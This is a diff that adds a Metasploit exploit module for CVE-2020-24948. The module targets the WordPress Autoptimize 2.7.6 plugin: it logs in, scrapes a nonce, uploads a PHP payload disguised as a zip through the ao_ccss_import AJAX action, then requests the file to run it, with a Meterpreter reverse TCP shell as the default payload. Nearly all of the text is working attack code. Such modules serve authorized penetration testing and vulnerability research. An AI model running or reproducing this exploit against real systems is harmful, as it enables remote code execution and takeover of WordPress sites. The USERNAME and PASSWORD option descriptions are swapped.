@@ -1,0 +1,109 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HTTP::Wordpress
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+      super(update_info(
+        info,
+        'Name'           => 'Wordpress Autoptimize Authenticated File Upload',
+        'Description'    => %q{
+          The ao_ccss_import AJAX call does not ensure that the file provided is a legitimate Zip file,
+          allowing high privilege users to upload arbitrary files, such as PHP, leading to RCE.
+        },
+        'Author'         =>
+          [
+            'Khanh Nguyen - Suncsr Team', # Vulnerability discovery
+            'Hoa Nguyen - Suncsr Team',    # Metasploit module
+            'Thien Ngo - Suncsr Team' # Metasploit module
+          ],
+        'License'        => MSF_LICENSE,
+        'References'     =>
+          [
+            ['CVE', '2020-24948'],
+            ['EDB', '48770'],
+            ['WPVDB', '10372']
+          ],
+        'Privileged'     => false,
+        'Platform'       => ['php'],
+        'Arch'           => ARCH_PHP,
+        'DefaultOptions' => {
+            'PAYLOAD' => 'php/meterpreter/reverse_tcp'
+          },
+        'Targets'        => [['WP Autoptimize 2.7.6', {}]],
+        'DefaultTarget'  => 0,
+        'DisclosureDate' => '2020-08-24'))
+
+      register_options(
+        [
+          OptString.new('USERNAME', [true, 'The WordPress password to authenticate with', nil]),
+          OptString.new('PASSWORD', [true, 'The WordPress username to authenticate with', nil])
+        ])
+    end
+
+  def check
+      check_plugin_version_from_readme('autoptimize','2.7.7')
+  end
+
+  def ao_ccss_import_nonce(cookie)
+      res = send_request_cgi({
+          'uri' => normalize_uri(wordpress_url_backend,'options-general.php'),
+          'cookie' => cookie,
+          'vars_get' => {
+              'page' => 'ao_critcss'
+            }
+      },5)
+
+      if res.code == 200
+          print_good("Found ao_ccss_import_nonce_code Value!")
+        else
+         fail_with(Failure::Unknown,'Server did not response in an expected way')
+        end
+
+      ao_ccss_import_nonce_code = res.body.match(/'ao_ccss_import_nonce', '(\w+)/).captures[0]
+      return ao_ccss_import_nonce_code
+  end
+
+  def exploit
+      username = datastore['USERNAME']
+      password = datastore['PASSWORD']
+      print_status("Trying to login as #{username}")
+      cookie = wordpress_login(datastore['USERNAME'],datastore['PASSWORD'])
+      if cookie.nil?
+        print_error("Unable to login as #{username}")
+      end
+
+      vars = ao_ccss_import_nonce(cookie)
+      print_status("Trying to upload payload")
+      filename = "#{rand_text_alpha_lower(8)}.php"
+
+      data = Rex::MIME::Message.new
+      data.add_part('ao_ccss_import', nil, nil, 'form-data; name="action"')
+      data.add_part(vars, nil, nil, 'form-data; name="ao_ccss_import_nonce"')
+      data.add_part(payload.encoded, 'application/zip', nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
+      post_data = data.to_s
+      print_status("Uploading payload")
+
+      res = send_request_cgi({
+          'method' => 'POST',
+          'uri' => normalize_uri(wordpress_url_backend,'admin-ajax.php'),
+          'ctype' => "multipart/form-data; boundary=#{data.bound}",
+          'data' => post_data,
+          'cookie' => cookie
+      })
+
+      if res.code == 200
+         register_files_for_cleanup(filename)
+      else
+        fail_with(Failure::Unknown,'Server did not response in an expected way')
+      end
+
+    print_status("Calling uploaded file #{filename}")
+    send_request_cgi({'uri' => normalize_uri(wordpress_url_wp_content, 'uploads','ao_ccss',filename)},5)
+ end
+end
